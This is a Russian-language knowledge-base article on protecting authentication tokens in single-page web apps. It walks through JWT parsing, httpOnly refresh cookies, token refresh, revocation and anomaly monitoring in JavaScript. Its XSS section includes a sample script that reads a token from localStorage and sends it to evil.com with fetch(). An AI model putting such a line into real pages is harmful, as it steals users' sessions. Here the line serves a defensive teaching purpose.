---
aliases: [Token Security, Безопасность токенов, Защита токенов в SPA]
tags: [security, tokens, authentication, spa, jwt]
---

# Безопасность-токенов

## Обзор

Токены аутентификации - это критический компонент безопасности современных веб-приложений, особенно в архитектуре одностраничных приложений (SPA). Безопасность токенов включает в себя правильное хранение, использование, обновление и защиту от различных типов атак. В этом разделе рассматриваются лучшие практики и методы обеспечения безопасности токенов в веб-приложениях.

## Типы токенов аутентификации

### 1. JWT (JSON Web Tokens)

JWT - это открытый стандарт (RFC 7519) для создания токенов, содержащих утверждения (claims) в компактном и безопасном формате:

```javascript
// Пример JWT токена
const jwtToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";

// Расшифровка JWT (только для примера - в реальности payload не зашифрован!)
function parseJWT(token) {
    const base64Url = token.split('.')[1];
    const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
    const jsonPayload = decodeURIComponent(atob(base64).split('').map(c => 
        '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)
    ).join(''));

    return JSON.parse(jsonPayload);
}
```

### 2. Access и Refresh токены

Современные приложения часто используют пару токенов:

- **Access токены**: короткоживущие токены для доступа к API
- **Refresh токены**: долгоживущие токены для обновления access токенов

### 3. Session токены

Токены сессии, которые хранятся на сервере и связаны с пользовательской сессией.

## Уязвимости токенов

### 1. XSS-атаки

Токены, хранящиеся в localStorage/sessionStorage, могут быть украдены через XSS-атаки:

```javascript
// Уязвимый код - токен в localStorage
localStorage.setItem('authToken', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...');

// При XSS-атаке злоумышленник может украсть токен
const maliciousScript = `
    var token = localStorage.getItem('authToken');
    fetch('https://evil.com/steal?token=' + token);
`;
```

> [!warning] Важно
> Never store sensitive tokens in localStorage or sessionStorage as they are accessible via JavaScript and vulnerable to XSS attacks.

### 2. Утечка токенов через URL

Токены в URL могут быть сохранены в истории браузера, логах сервера и реферерах:

```javascript
// Небезопасное использование токена в URL
const unsafeUrl = `/api/data?token=${authToken}`;

// Более безопасный подход - токен в заголовке
const response = await fetch('/api/data', {
    headers: {
        'Authorization': `Bearer ${authToken}`
    }
});
```

### 3. Man-in-the-Middle атаки

При передаче токенов по незащищенному соединению они могут быть перехвачены.

## Лучшие практики безопасности токенов

### 1. Хранение токенов

#### HttpOnly куки для Refresh токенов

Используйте httpOnly куки для хранения refresh токенов:

```javascript
// Пример установки refresh токена в httpOnly куки на сервере
app.post('/auth/login', async (req, res) => {
    // Аутентификация пользователя
    const user = await authenticateUser(req.body);
    
    if (user) {
        const accessToken = generateAccessToken(user);
        const refreshToken = generateRefreshToken(user);
        
        // Установка refresh токена в httpOnly куки
        res.cookie('refreshToken', refreshToken, {
            httpOnly: true,
            secure: process.env.NODE_ENV === 'production', // только по HTTPS в продакшене
            sameSite: 'strict',
            maxAge: 7 * 24 * 60 * 60 * 1000 // 7 дней
        });
        
        // Отправка access токена клиенту (например, в body или заголовке)
        res.json({ accessToken });
    } else {
        res.status(401).json({ error: 'Неверные учетные данные' });
    }
});
```

#### Безопасное хранение Access токенов

Для SPA access токены можно хранить в памяти приложения:

```javascript
// Сервис управления токенами
class TokenManager {
    constructor() {
        this.accessToken = null;
        this.refreshToken = null;
        this.tokenExpiry = null;
    }

    setTokens(accessToken, refreshToken = null) {
        this.accessToken = accessToken;
        
        if (refreshToken) {
            this.refreshToken = refreshToken;
        }
        
        // Установка времени истечения токена
        const payload = this.parseJWT(accessToken);
        this.tokenExpiry = payload.exp ? payload.exp * 1000 : null;
    }

    getAccessToken() {
        // Проверка срока действия токена
        if (this.isTokenExpired()) {
            return null;
        }
        return this.accessToken;
    }

    isTokenExpired() {
        if (!this.tokenExpiry) {
            return false;
        }
        return Date.now() >= this.tokenExpiry;
    }

    parseJWT(token) {
        try {
            const base64Url = token.split('.')[1];
            const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
            const jsonPayload = decodeURIComponent(atob(base64).split('').map(c => 
                '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)
            ).join(''));

            return JSON.parse(jsonPayload);
        } catch (error) {
            console.error('Ошибка парсинга JWT:', error);
            return {};
        }
    }

    clearTokens() {
        this.accessToken = null;
        this.refreshToken = null;
        this.tokenExpiry = null;
    }
}

const tokenManager = new TokenManager();
```

### 2. Обновление токенов

#### Автоматическое обновление токенов

Реализуйте автоматическое обновление токенов:

```javascript
class TokenRefreshHandler {
    constructor(tokenManager) {
        this.tokenManager = tokenManager;
        this.isRefreshing = false;
        this.failedQueue = [];
    }

    async getValidToken() {
        if (!this.tokenManager.isTokenExpired()) {
            return this.tokenManager.getAccessToken();
        }

        if (this.isRefreshing) {
            // Если обновление уже в процессе, ждем завершения
            return new Promise((resolve, reject) => {
                this.failedQueue.push({ resolve, reject });
            });
        }

        return this.refreshAccessToken();
    }

    async refreshAccessToken() {
        this.isRefreshing = true;

        try {
            const refreshToken = this.tokenManager.refreshToken;
            
            if (!refreshToken) {
                throw new Error('Refresh токен отсутствует');
            }

            const response = await fetch('/api/auth/refresh', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ refreshToken })
            });

            if (!response.ok) {
                throw new Error('Не удалось обновить токен');
            }

            const data = await response.json();
            
            // Обновление токенов
            this.tokenManager.setTokens(data.accessToken, data.refreshToken);

            // Обработка запросов из очереди
            this.processQueue(null, data.accessToken);

            return data.accessToken;
        } catch (error) {
            console.error('Ошибка обновления токена:', error);
            this.processQueue(error, null);
            this.tokenManager.clearTokens();
            window.location.href = '/login'; // Перенаправление на страницу входа
            return null;
        } finally {
            this.isRefreshing = false;
        }
    }

    processQueue(error, token = null) {
        this.failedQueue.forEach(({ resolve, reject }) => {
            if (error) {
                reject(error);
            } else {
                resolve(token);
            }
        });
        
        this.failedQueue = [];
    }
}

const tokenRefreshHandler = new TokenRefreshHandler(tokenManager);
```

### 3. Защита от угона токенов

#### Валидация токенов на сервере

Всегда проверяйте токены на сервере:

```javascript
// Промежуточное ПО для проверки токенов
function authenticateToken(req, res, next) {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1]; // Bearer TOKEN

    if (!token) {
        return res.status(401).json({ error: 'Токен отсутствует' });
    }

    jwt.verify(token, process.env.ACCESS_TOKEN_SECRET, (err, user) => {
        if (err) {
            if (err.name === 'TokenExpiredError') {
                return res.status(401).json({ error: 'Токен истек' });
            }
            return res.status(403).json({ error: 'Недействительный токен' });
        }
        
        req.user = user;
        next();
    });
}

// Использование в маршрутах
app.get('/api/profile', authenticateToken, (req, res) => {
    // Маршрут доступен только аутентифицированным пользователям
    res.json({ user: req.user });
});
```

#### Проверка дополнительных атрибутов

Добавьте дополнительные проверки для повышения безопасности:

```javascript
// Проверка токена с дополнительными атрибутами
function validateTokenWithAttributes(token, expectedAttributes) {
    try {
        const decoded = jwt.verify(token, process.env.ACCESS_TOKEN_SECRET);
        
        // Проверка IP-адреса (если сохранен в токене)
        if (expectedAttributes.ip && decoded.ip !== expectedAttributes.ip) {
            throw new Error('IP-адрес не совпадает');
        }
        
        // Проверка User-Agent (если сохранен в токене)
        if (expectedAttributes.userAgent && decoded.userAgent !== expectedAttributes.userAgent) {
            throw new Error('User-Agent не совпадает');
        }
        
        // Проверка времени последней активности
        if (decoded.lastActivity && 
            (Date.now() - decoded.lastActivity) > MAX_INACTIVITY_TIME) {
            throw new Error('Сессия неактивна слишком долго');
        }
        
        return decoded;
    } catch (error) {
        console.error('Ошибка валидации токена:', error);
        return null;
    }
}
```

### 4. Безопасная передача токенов

#### Использование HTTPS

Всегда используйте HTTPS для передачи токенов:

```javascript
// Убедиться, что API-вызовы используют HTTPS
class SecureAPIClient {
    constructor(baseURL) {
        if (!baseURL.startsWith('https://') && process.env.NODE_ENV === 'production') {
            throw new Error('API должен использовать HTTPS в продакшене');
        }
        this.baseURL = baseURL;
    }

    async makeAuthenticatedRequest(endpoint, options = {}) {
        const token = await tokenRefreshHandler.getValidToken();
        
        if (!token) {
            throw new Error('Требуется аутентификация');
        }

        const response = await fetch(`${this.baseURL}${endpoint}`, {
            ...options,
            headers: {
                ...options.headers,
                'Authorization': `Bearer ${token}`,
                'Content-Type': 'application/json'
            }
        });

        return response;
    }
}
```

#### Предотвращение утечки токенов

Избегайте логирования токенов и их передачи в небезопасных местах:

```javascript
// Безопасное логирование ошибок
function safeLogError(error, context = {}) {
    // Удаление чувствительных данных из контекста
    const safeContext = { ...context };
    if (safeContext.token) {
        safeContext.token = '[REDACTED]';
    }
    if (safeContext.headers && safeContext.headers.Authorization) {
        safeContext.headers.Authorization = '[REDACTED]';
    }

    console.error('API Error:', {
        message: error.message,
        context: safeContext,
        timestamp: new Date().toISOString()
    });
}
```

## Продвинутые методы безопасности

### 1. Токены с ограниченным временем жизни

Реализуйте короткое время жизни access токенов:

```javascript
// Генерация токенов с коротким сроком действия
function generateAccessToken(user, expiresIn = '15m') {
    return jwt.sign(
        { 
            userId: user.id, 
            role: user.role,
            // Дополнительные атрибуты безопасности
            iat: Math.floor(Date.now() / 1000),
            exp: Math.floor(Date.now() / 1000) + (15 * 60) // 15 минут
        },
        process.env.ACCESS_TOKEN_SECRET,
        { algorithm: 'HS256' }
    );
}

// Генерация refresh токенов с более длительным сроком действия
function generateRefreshToken(user, expiresIn = '7d') {
    return jwt.sign(
        { 
            userId: user.id,
            type: 'refresh',
            iat: Math.floor(Date.now() / 1000),
            exp: Math.floor(Date.now() / 1000) + (7 * 24 * 60 * 60) // 7 дней
        },
        process.env.REFRESH_TOKEN_SECRET,
        { algorithm: 'HS256' }
    );
}
```

### 2. Протокол обновления токенов

Реализуйте безопасный протокол обновления токенов:

```javascript
// Серверная реализация обновления токенов
app.post('/api/auth/refresh', async (req, res) => {
    const { refreshToken } = req.body;

    if (!refreshToken) {
        return res.status(401).json({ error: 'Refresh токен отсутствует' });
    }

    try {
        // Проверка refresh токена в базе данных
        const storedToken = await Token.findOne({ token: refreshToken, type: 'refresh' });
        
        if (!storedToken || storedToken.isRevoked) {
            return res.status(403).json({ error: 'Invalid refresh token' });
        }

        // Проверка пользователя
        const user = await User.findById(storedToken.userId);
        if (!user) {
            // Удаление токена, если пользователь не существует
            await Token.deleteOne({ token: refreshToken });
            return res.status(403).json({ error: 'User not found' });
        }

        // Генерация новых токенов
        const newAccessToken = generateAccessToken(user);
        const newRefreshToken = generateRefreshToken(user);

        // Обновление токена в базе данных
        await Token.updateOne(
            { token: refreshToken },
            { 
                token: newRefreshToken,
                expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
            }
        );

        // Установка нового refresh токена в httpOnly куки
        res.cookie('refreshToken', newRefreshToken, {
            httpOnly: true,
            secure: process.env.NODE_ENV === 'production',
            sameSite: 'strict',
            maxAge: 7 * 24 * 60 * 60 * 1000
        });

        res.json({ 
            accessToken: newAccessToken,
            refreshToken: newRefreshToken 
        });
    } catch (error) {
        console.error('Ошибка обновления токена:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});
```

### 3. Отзыв токенов

Реализуйте механизм отзыва токенов:

```javascript
// Сервис отзыва токенов
class TokenRevocationService {
    constructor() {
        this.revokedTokens = new Set();
        this.tokenBlacklist = new Map(); // для долгосрочного хранения
    }

    async revokeToken(token, userId) {
        // Добавление токена в черный список
        this.revokedTokens.add(token);
        
        // Сохранение в постоянное хранилище
        await this.saveToBlacklist(token, userId);
    }

    async revokeAllUserTokens(userId) {
        // Отзыв всех токенов пользователя
        await Token.updateMany(
            { userId: userId, type: 'refresh' },
            { isRevoked: true }
        );
    }

    async isTokenRevoked(token) {
        // Проверка в краткосрочном кэше
        if (this.revokedTokens.has(token)) {
            return true;
        }

        // Проверка в базе данных
        const blacklistedToken = await Token.findOne({ 
            token: token, 
            isRevoked: true 
        });
        
        return !!blacklistedToken;
    }

    async saveToBlacklist(token, userId) {
        try {
            await Token.create({
                token: token,
                userId: userId,
                type: 'revoked',
                isRevoked: true,
                createdAt: new Date(),
                expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000) // 30 дней
            });
        } catch (error) {
            console.error('Ошибка сохранения токена в черный список:', error);
        }
    }
}

const tokenRevocationService = new TokenRevocationService();
```

## Мониторинг и аудит токенов

### 1. Логирование использования токенов

```javascript
// Служба логирования использования токенов
class TokenAuditLogger {
    async logTokenUsage(token, userId, action, ipAddress, userAgent) {
        try {
            await AuditLog.create({
                userId: userId,
                action: action, // 'login', 'api_access', 'token_refresh', 'logout'
                tokenUsed: true,
                ipAddress: ipAddress,
                userAgent: userAgent,
                timestamp: new Date()
            });
        } catch (error) {
            console.error('Ошибка логирования аудита токена:', error);
        }
    }

    async logTokenAnomaly(token, userId, anomalyType, details) {
        try {
            await SecurityAlert.create({
                userId: userId,
                type: 'token_anomaly',
                anomalyType: anomalyType, // 'multiple_devices', 'unusual_location', 'high_frequency'
                details: details,
                token: token.substring(0, 10) + '...', // маскировка токена
                timestamp: new Date()
            });
        } catch (error) {
            console.error('Ошибка логирования аномалии токена:', error);
        }
    }
}

const tokenAuditLogger = new TokenAuditLogger();
```

### 2. Обнаружение аномального использования

```javascript
// Система обнаружения аномального использования токенов
class TokenAnomalyDetector {
    constructor() {
        this.userActivity = new Map();
    }

    async checkAnomalies(token, userId, ipAddress, userAgent) {
        const now = Date.now();
        const userActivity = this.getUserActivity(userId);
        
        // Проверка частоты использования
        const recentRequests = userActivity.requests.filter(req => 
            now - req.timestamp < 60000 // за последнюю минуту
        );
        
        if (recentRequests.length > 100) { // подозрительное количество запросов
            await this.reportAnomaly(userId, 'high_frequency', {
                requestCount: recentRequests.length,
                timeWindow: '1 minute'
            });
        }
        
        // Проверка использования с разных IP
        const uniqueIPs = new Set(userActivity.requests.map(req => req.ip));
        if (uniqueIPs.size > 3) {
            await this.reportAnomaly(userId, 'multiple_locations', {
                ipCount: uniqueIPs.size,
                ips: Array.from(uniqueIPs)
            });
        }
        
        // Добавление текущего запроса к активности
        userActivity.requests.push({
            timestamp: now,
            ip: ipAddress,
            userAgent: userAgent
        });
        
        // Ограничение размера истории
        if (userActivity.requests.length > 1000) {
            userActivity.requests = userActivity.requests.slice(-500);
        }
    }

    getUserActivity(userId) {
        if (!this.userActivity.has(userId)) {
            this.userActivity.set(userId, { requests: [] });
        }
        return this.userActivity.get(userId);
    }

    async reportAnomaly(userId, anomalyType, details) {
        console.warn(`Обнаружена аномалия токена для пользователя ${userId}:`, 
                     anomalyType, details);
        
        // Отзыв токенов при серьезных аномалиях
        if (['multiple_locations', 'high_frequency'].includes(anomalyType)) {
            await tokenRevocationService.revokeAllUserTokens(userId);
        }
        
        // Логирование аномалии
        await tokenAuditLogger.logTokenAnomaly(null, userId, anomalyType, details);
    }
}

const tokenAnomalyDetector = new TokenAnomalyDetector();
```

## Заключение

Безопасность токенов - это многоуровневый процесс, требующий внимательного подхода к хранению, передаче, обновлению и мониторингу. Ключевыми элементами безопасного управления токенами являются:

- Правильное хранение токенов (httpOnly куки для refresh токенов)
- Использование короткоживущих access токенов с автоматическим обновлением
- Серверная проверка всех токенов
- Механизмы отзыва токенов
- Мониторинг и аудит использования токенов

Реализация этих практик значительно повышает безопасность веб-приложения и защищает пользовательские сессии от компрометации.

## См. также

- [[Безопасность-в-SPA]]
- [[Управление-сессиями-и-аутентификацией]]
- [[XSS-защита]]
- [[CSRF-защита]]
- [[Безопасность-куки]]